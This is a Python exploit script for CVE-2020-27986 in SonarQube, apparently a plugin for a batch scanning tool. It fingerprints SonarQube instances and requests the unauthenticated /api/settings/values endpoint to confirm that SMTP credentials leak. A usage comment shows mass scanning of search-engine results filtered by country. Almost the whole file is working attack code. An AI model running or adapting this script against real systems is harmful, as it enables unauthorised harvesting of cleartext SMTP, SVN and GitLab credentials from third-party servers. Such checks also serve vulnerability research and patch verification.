# coding=utf-8
# @Author   : zpchcbd HG team
# @blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-11-19 17:40

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.SonarQube.CVE-2020-27986 -cs -fs "\"SonarQube\" && country=\"CN\""


class Script(BaseScript):
    name = 'SonarQube'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.BACKUP
        # 编号
        self.bug_number = 'CVE-2020-27986'
        # 来源
        self.bug_refer = 'https://mp.weixin.qq.com/s/iCHikHfJZBjNYr-950gKJA'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/api/settings/values']
        # 相关信息
        self.info = '''SonarQube 8.4.2.36762 allows remote attackers to discover cleartext SMTP,SVN, and GitLab credentials via the api/settings/values URI.SonarQube API 未授权下载源代码'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '<title>SonarQube</title>' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'email.smtp_host.secured' in text and 'email.smtp_password.secured' in text\
                        and 'email.smtp_port.secured' in text and 'email.smtp_username.secured' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass